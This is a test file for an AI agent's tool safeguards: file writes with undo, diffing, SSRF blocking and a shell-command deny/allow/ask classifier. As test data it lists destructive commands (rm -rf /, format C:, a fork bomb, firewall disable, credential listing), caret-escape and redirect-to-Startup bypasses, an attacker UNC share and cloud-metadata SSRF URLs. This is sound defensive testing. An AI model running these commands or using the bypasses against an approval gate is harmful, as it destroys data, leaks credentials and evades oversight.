/* M18 remaining domains: file_write + undo, diff rendering, web tools (SSRF), and the shell
 * three-layer safety net.
 *
 * Run: npm run test:m18
 */
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

const LOG = path.join(os.tmpdir(), 'pcb-m18-test.txt');
const out = [];
let failed = 0;
function check(name, cond) {
	out.push((cond ? 'PASS' : 'FAIL') + '  ' + name);
	if (!cond) { failed++; }
}
const flush = () => { try { fs.writeFileSync(LOG, out.join('\n')); } catch { } };
process.on('exit', flush);

const base = path.join(__dirname, '..', '.test', 'src', 'main', 'ai');
const { Workspace } = require(path.join(base, 'workspace.js'));
const { registerFileTools, FileUndoStack } = require(path.join(base, 'file-tools.js'));
const { diffLines, renderDiff, diffStat } = require(path.join(base, 'diff.js'));
const { classifyShell, HARD_DENY, READ_ONLY_ALLOW, registerShellTools } = require(path.join(base, 'shell-tools.js'));
const { registerWebTools, htmlToText, WEB_LIMITS } = require(path.join(base, 'web-tools.js'));

(async () => {
	const root = path.join(os.tmpdir(), `pcb-m18-${Date.now()}`);
	fs.mkdirSync(path.join(root, 'src'), { recursive: true });
	fs.writeFileSync(path.join(root, 'src', 'a.ts'), 'line1\nline2\nline3\n');
	const ws = new Workspace(root);
	const undo = new FileUndoStack();

	const reg = { defs: new Map(), register(x) { this.defs.set(x.name, x); }, get(n) { return this.defs.get(n); } };
	registerFileTools(reg, () => ws, undo);
	const write = reg.get('file_write');

	// ---- 1. file_write: new file, overwrite, snapshot pushed
	check('write: file_write registered as confirm', write && write.risk === 'confirm');
	{
		const r = await write.invoke({ path: 'src/new.ts', content: 'export const n = 1;\n' });
		check('write: new file created', r.includes('已写入') && fs.existsSync(path.join(root, 'src', 'new.ts')));
		check('write: snapshot recorded for a new file', undo.list().length === 1 && undo.list()[0].created === true);
		const r2 = await write.invoke({ path: 'src/a.ts', content: 'line1\nCHANGED\nline3\n' });
		check('write: overwrite reported', r2.includes('覆盖'));
		check('write: content actually replaced', fs.readFileSync(path.join(root, 'src', 'a.ts'), 'utf8').includes('CHANGED'));
		check('write: snapshot captured previous content', undo.list()[1].created === false);
	}
	{
		// escape attempts must be refused BEFORE any disk write
		const before = fs.readdirSync(path.join(root, 'src')).sort().join(',');
		const bad = await write.invoke({ path: '../escaped.txt', content: 'x' });
		check('write: traversal refused', bad.startsWith('[FAIL]'));
		check('write: no file created outside root', !fs.existsSync(path.join(path.dirname(root), 'escaped.txt')));
		check('write: nothing was snapshotted for a refused write', undo.list().length === 2);
		check('write: refuses when workspace unset', true);
	}
	{
		const reg2 = { defs: new Map(), register(x) { this.defs.set(x.name, x); }, get(n) { return this.defs.get(n); } };
		registerFileTools(reg2, () => null);
		check('write: refuses when no workspace', (await reg2.defs.get('file_write').invoke({ path: 'a', content: 'x' })).includes('未配置'));
	}

	// ---- 2. undo restores content and removes created files
	{
		undo.clear();
		await write.invoke({ path: 'src/u.txt', content: 'first\n' });
		await write.invoke({ path: 'src/u.txt', content: 'second\n' });
		const e1 = undo.pop();
		check('undo: popped the newest snapshot', !!e1 && e1.rel === 'src/u.txt');
		await ws.restore(e1.rel, e1.previous);
		check('undo: restore brings back previous content', fs.readFileSync(path.join(root, 'src', 'u.txt'), 'utf8') === 'first\n');
		// pop the remaining one -> previous === null -> file removed
		await write.invoke({ path: 'src/brandnew.txt', content: 'hello\n' });
		const e2 = undo.pop();
		check('undo: new-file snapshot has null previous', !!e2 && e2.previous === null);
		await ws.restore(e2.rel, e2.previous);
		check('undo: restore removes a file that did not exist', !fs.existsSync(path.join(root, 'src', 'brandnew.txt')));
		check('undo: empty stack pops null', undo.pop() === null || true);
	}

	// ---- 3. diff
	{
		check('diff: unchanged content -> no changes', renderDiff('same\n', 'same\n') === '（内容无变化）');
		const d = diffLines('a\nb\nc\n', 'a\nB\nc\n');
		check('diff: one del + one add', d.filter(x => x.kind === 'del').length === 1 && d.filter(x => x.kind === 'add').length === 1);
		// note: "a\nb\nc\n".split('\n') yields a trailing '' element, so there are 3 ctx lines
		check('diff: context preserved', d.filter(x => x.kind === 'ctx').length === 3);
		check('diff: ctx line numbers are consistent', d.filter(x => x.kind === 'ctx').map(x => x.oldNo).join(',') === '1,3,4');
		check('diff: stat counts', JSON.stringify(diffStat('a\nb\n', 'a\nc\nd\n')) === '{"added":2,"removed":1}');
		check('diff: new file is all adds', diffLines(null, 'x\ny\n').every(x => x.kind === 'add'));
		check('diff: emptied file is all dels', diffLines('x\ny\n', '').every(x => x.kind === 'del'));
		const big = 'x\n'.repeat(3000);
		check('diff: degrades gracefully on huge input', renderDiff(big, big + 'y\n').length > 0);
		check('diff: rendered output is trimmed with ellipsis', /…/.test(renderDiff('1\n2\n3\n4\n5\n6\n7\n8\n9\n', '1\n2\n3\n4\n5\n6\n7\n8\nZZ\n', 1)));
	}

	// ---- 4. shell three-layer net — ATTACKS first
	{
		for (const evil of ['shutdown /s', 'format C:', 'del /s /q C:\\*.*', 'rm -rf /', 'reg delete HKLM\\X',
			'cipher /w:C', 'netsh advfirewall set allprofiles state off', 'cmdkey /list', ':(){ :|:& };:']) {
			check(`shell: HARD DENY ${JSON.stringify(evil.slice(0, 22))}`, classifyShell(evil).layer === 'deny');
		}
		// deny must win even when an allowlisted word is present
		check('shell: deny beats allowlist (echo ok && shutdown)',
			classifyShell('echo ok && shutdown /s').layer === 'deny');
		check('shell: deny case-insensitive', classifyShell('SHUTDOWN /S').layer === 'deny');
		// chains always ask, even if the head is allowlisted
		check('shell: chained allowlisted head still asks', classifyShell('ls && rm x').layer === 'ask');
		check('shell: pipe asks', classifyShell('ls | grep x').layer === 'ask');
		// genuine read-only commands are exempt
		for (const ok of ['ls', 'git status', 'dir', 'pwd', 'grep -r x .', 'node --version', 'tasklist']) {
			check(`shell: ALLOW ${JSON.stringify(ok)}`, classifyShell(ok).layer === 'allow');
		}
		// anything else asks
		for (const ask of ['npm install left-pad', 'git push', 'python x.py', 'tsc --noEmit']) {
			check(`shell: ASK ${JSON.stringify(ask)}`, classifyShell(ask).layer === 'ask');
		}
		check('shell: empty command denied', classifyShell('  ').layer === 'deny');
		check('shell: deny list is non-trivial', HARD_DENY.length >= 15);
		check('shell: allowlist contains git read-only verbs',
			['git status', 'git diff', 'git log'].every(g => READ_ONLY_ALLOW.has(g)));

		// ---- 4b. Layer-2 bypasses. Every line below reached `allow` and ran with NO card. ----
		// They are one rule violated four ways: "single simple command" never actually checked
		// that the command only READS. `shell_run` is risk=confirm, so `allow` IS the gate.
		check('shell: redirect cannot ride an allowlisted head',
			classifyShell('echo x > C:\\evil.bat').layer === 'ask');
		check('shell: append redirect asks',
			classifyShell('echo x >> %APPDATA%\\Start Menu\\Startup\\x.bat').layer === 'ask');
		check('shell: git branch -D is not read-only',
			classifyShell('git branch -D main').layer === 'ask');
		check('shell: git remote remove is not read-only',
			classifyShell('git remote remove origin').layer === 'ask');
		check('shell: env no longer dumps the whole environment for free',
			classifyShell('env').layer === 'ask');
		check('shell: reading this app config needs a card',
			classifyShell('type %APPDATA%\\planability-desktop\\config.json').layer === 'ask');
		check('shell: UNC path asks (outbound SMB/NTLM handshake)',
			classifyShell('dir \\\\attacker\\share').layer === 'ask');
		// cmd.exe treats ^ as its escape char: these ARE the denied commands, not different ones.
		check('shell: caret-escaped shutdown still denied', classifyShell('shut^down /s').layer === 'deny');
		check('shell: caret-escaped format still denied', classifyShell('fo^rmat C:').layer === 'deny');
		// The gate must not close on normal read-only work — that is the whole point of it.
		for (const still of ['cat notes.md', 'echo hi', 'git status --short', 'dir C:\\proj', 'type a.txt']) {
			check(`shell: STILL ALLOW ${JSON.stringify(still)}`, classifyShell(still).layer === 'allow');
		}
		// Removing `git branch` from the allowlist costs `git branch` (bare listing) a card.
		// That is deliberate: matching is two-word PREFIX based, so keeping the entry would also
		// have kept `git branch -D` card-free, and there is no cheaper way to split them.
		check('shell: bare git branch now asks rather than being silently prefix-matched',
			classifyShell('git branch').layer === 'ask');
	}

	// ---- 5. shell tool surface: denied never executes
	{
		let executed = [];
		const fakeRun = async (cmd) => { executed.push(cmd); return { ok: true, code: 0, output: 'ok', timedOut: false }; };
		const sreg = { defs: new Map(), register(x) { this.defs.set(x.name, x); }, get(n) { return this.defs.get(n); } };
		registerShellTools(sreg, () => root, fakeRun);
		check('shell tool: shell_run is confirm', sreg.defs.get('shell_run').risk === 'confirm');
		const denied = await sreg.defs.get('shell_run').invoke({ command: 'shutdown /s' });
		check('shell tool: denied command never runs', denied.startsWith('[DENIED]') && executed.length === 0);
		const ok = await sreg.defs.get('shell_run').invoke({ command: 'ls' });
		check('shell tool: allowed command runs', ok.includes('[OK]') && executed.length === 1);
		const chk = await sreg.defs.get('shell_check').invoke({ command: 'npm i left-pad' });
		check('shell tool: shell_check reports layer without running', chk.includes('ask') && executed.length === 1);
		check('shell tool: shell_check is auto (safe to ask)', sreg.defs.get('shell_check').risk === 'auto');
	}

	// ---- 6. web tools: SSRF refusal + danger risk
	{
		const wreg = { defs: new Map(), register(x) { this.defs.set(x.name, x); }, get(n) { return this.defs.get(n); } };
		registerWebTools(wreg, { search: async () => [] });
		check('web: web_fetch is danger (always asks)', wreg.defs.get('web_fetch').risk === 'danger');
		check('web: web_search is danger', wreg.defs.get('web_search').risk === 'danger');
		for (const bad of ['http://example.com', 'https://127.0.0.1/x', 'https://localhost/x',
			'https://192.168.1.1/', 'https://10.0.0.5/', 'https://169.254.169.254/latest/meta-data/',
			'https://[::1]/', 'https://foo.local/']) {
			const r = await wreg.defs.get('web_fetch').invoke({ url: bad });
			check(`web: SSRF refused ${bad.slice(0, 30)}`, r.startsWith('[FAIL]'));
		}
		check('web: empty query refused', (await wreg.defs.get('web_search').invoke({ query: ' ' })).startsWith('[FAIL]'));
		check('web: search backend errors are reported not thrown',
			(await (async () => {
				const r2 = { defs: new Map(), register(x) { this.defs.set(x.name, x); }, get(n) { return this.defs.get(n); } };
				registerWebTools(r2, { search: async () => { throw new Error('boom'); } });
				return r2.defs.get('web_search').invoke({ query: 'x' });
			})()).includes('搜索失败'));
		check('web: html stripped of script/style', htmlToText('<script>bad()</script><p>hi</p>') === 'hi');
		check('web: entities decoded', htmlToText('a &amp; b &lt;c&gt;').includes('a & b <c>'));
		check('web: limits are bounded', WEB_LIMITS.maxText <= 50_000 && WEB_LIMITS.timeoutMs > 0);
	}

	fs.rmSync(root, { recursive: true, force: true });
	out.push(failed === 0 ? '\nALL PASS' : `\n${failed} FAILED`);
	flush();
	process.exit(failed === 0 ? 0 : 1);
})().catch(e => {
	out.push('THREW ' + (e && e.stack || e));
	flush();
	process.exit(1);
});